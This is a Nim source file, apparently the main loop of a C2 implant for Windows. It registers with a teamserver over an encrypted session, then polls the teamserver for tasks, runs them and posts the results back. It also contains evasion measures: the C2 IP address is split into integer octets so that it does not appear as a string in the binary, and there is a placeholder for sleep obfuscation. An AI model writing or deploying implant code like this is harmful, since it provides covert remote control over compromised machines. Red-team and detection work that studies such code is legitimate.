import strformat, os, times, system, base64
import winim

import core/[task, taskresult, heartbeat, http, register]
import ../../common/[types, utils, crypto]
import sugar

const ListenerUuid {.strdefine.}: string = ""
const Octet1 {.intdefine.}: int = 0
const Octet2 {.intdefine.}: int = 0
const Octet3 {.intdefine.}: int = 0
const Octet4 {.intdefine.}: int = 0
const ListenerPort {.intdefine.}: int = 5555
const SleepDelay {.intdefine.}: int = 10
const ServerPublicKey {.strdefine.}: string = ""

proc main() = 
    #[
        The process is the following:
        1. Agent reads configuration file, which contains data relevant to the listener, such as IP, PORT, UUID and sleep settings
        2. Agent collects information relevant for the registration (using Windows API)
        3. Agent registers to the teamserver 
        4. Agent moves into an infinite loop, which is only exited when the agent is tasked to terminate
    ]#  

    # The agent configuration is read at compile time using define/-d statements in nim.cfg
    # This configuration file can be dynamically generated from the teamserver management interface
    # Downside to this is obviously that readable strings, such as the listener UUID can be found in the binary
    when not defined(ListenerUuid) or not defined(Octet1) or not defined(Octet2) or not defined(Octet3) or not defined(Octet4) or not defined(ListenerPort) or not defined(SleepDelay):
        echo "Missing agent configuration."
        quit(0)

    # Reconstruct IP address, which is split into integers to prevent it from showing up as a hardcoded-string in the binary
    let address = $Octet1 & "." & $Octet2 & "." & $Octet3 & "." & $Octet4 

    # Create agent configuration
    var config: AgentConfig
    try: 
        let agentKeyPair = generateKeyPair() 
        let serverPublicKey = decode(ServerPublicKey).toKey() 

        config = AgentConfig(
            agentId: generateUUID(),
            listenerId: ListenerUuid,
            ip: address, 
            port: ListenerPort, 
            sleep: SleepDelay,
            sessionKey: deriveSessionKey(agentKeyPair, serverPublicKey),   # Perform key exchange to derive AES256 session key for encrypted communication
            agentPublicKey: agentKeyPair.publicKey
        )

        # Clean up agent's private key from memory
        zeroMem(agentKeyPair.privateKey[0].addr, sizeof(PrivateKey))

    except CatchableError as err:
        echo "[-] " & err.msg

    # Create registration payload
    var registration: AgentRegistrationData = config.collectAgentMetadata()
    let registrationBytes = config.serializeRegistrationData(registration)

    config.register(registrationBytes)
    echo fmt"[+] [{config.agentId}] Agent registered."

    #[
        Agent routine: 
        1. Sleep Obfuscation
        2. Retrieve task from /tasks endpoint
        3. Execute task and post result to /results
        4. If additional tasks have been fetched, go to 2.
        5. If no more tasks need to be executed, go to 1. 
    ]#
    while true: 

        # TODO: Replace with actual sleep obfuscation that encrypts agent memory
        sleep(config.sleep * 1000)

        let date: string = now().format("dd-MM-yyyy HH:mm:ss")
        echo fmt"[{date}] Checking in."

        # Retrieve task queue for the current agent by sending a check-in/heartbeat request
        # The check-in request contains the agentId, listenerId, so the server knows which tasks to return
        var heartbeat: Heartbeat = config.createHeartbeat()
        let 
            heartbeatBytes: seq[byte] = config.serializeHeartbeat(heartbeat)
            packet: string = config.getTasks(heartbeatBytes)

        if packet.len <= 0: 
            echo "No tasks to execute."
            continue

        let tasks: seq[Task] = config.deserializePacket(packet)
        
        if tasks.len <= 0: 
            echo "No tasks to execute."
            continue

        # Execute all retrieved tasks and return their output to the server
        for task in tasks: 
            var result: TaskResult = config.handleTask(task)
            let resultBytes: seq[byte] = config.serializeTaskResult(result)

            config.postResults(resultBytes)
            
when isMainModule: 
    main() 